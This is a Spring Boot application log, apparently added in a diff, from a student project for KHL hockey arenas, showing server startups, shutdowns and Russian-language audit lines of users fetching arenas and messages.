+06-05-2024 14:58:19 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:58:19 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:58:20 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:58:20 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:58:20 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:58:20 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 14:58:20 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:58:20 INFO  Started KhlArenasProjectApp in 3.965 seconds (process running for 4.312)
+06-05-2024 14:58:26 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:58:26 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:58:26 INFO  Completed initialization in 1 ms
+06-05-2024 14:58:31 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 15:00:22 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 15:00:22 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 15:00:22 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 15:00:25 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 54487 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 15:00:25 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 15:00:26 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 15:00:26 INFO  Finished Spring Data repository scanning in 53 ms. Found 5 JPA repository interfaces.
+06-05-2024 15:00:26 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 15:00:26 INFO  Starting service [Tomcat]
+06-05-2024 15:00:26 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 15:00:26 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 15:00:26 INFO  Root WebApplicationContext: initialization completed in 1241 ms
+06-05-2024 15:00:26 INFO  HikariPool-1 - Starting...
+06-05-2024 15:00:27 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@7cf63b9a
+06-05-2024 15:00:27 INFO  HikariPool-1 - Start completed.
+06-05-2024 15:00:27 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 15:00:27 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 15:00:27 INFO  HHH000026: Second-level cache disabled
+06-05-2024 15:00:27 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 15:00:27 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 15:00:28 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 15:00:28 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 15:00:28 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 15:00:28 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 15:00:28 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@58701e8c, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@951461a, org.springframework.security.web.context.SecurityContextHolderFilter@28b16193, org.springframework.security.web.header.HeaderWriterFilter@4e93d23e, org.springframework.web.filter.CorsFilter@2f0e7008, org.springframework.security.web.authentication.logout.LogoutFilter@322593ed, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@30b29f55, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@5776a9f8, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@6771efaa, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@307e9c02, org.springframework.security.web.access.ExceptionTranslationFilter@53dd29e0, org.springframework.security.web.access.intercept.AuthorizationFilter@1677f98b]
+06-05-2024 15:00:28 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 15:00:28 INFO  Started KhlArenasProjectApp in 3.973 seconds (process running for 4.269)
+06-05-2024 15:00:33 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 15:00:33 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 15:00:33 INFO  Completed initialization in 1 ms
+06-05-2024 15:00:36 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 15:00:53 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 15:01:28 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 15:02:53 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 15:03:43 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=Добрый день, как настроение?)]
+06-05-2024 15:03:43 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 15:03:43 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 15:03:53 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 15:05:11 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 15:05:11 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 15:05:11 INFO  HikariPool-1 - Shutdown completed.
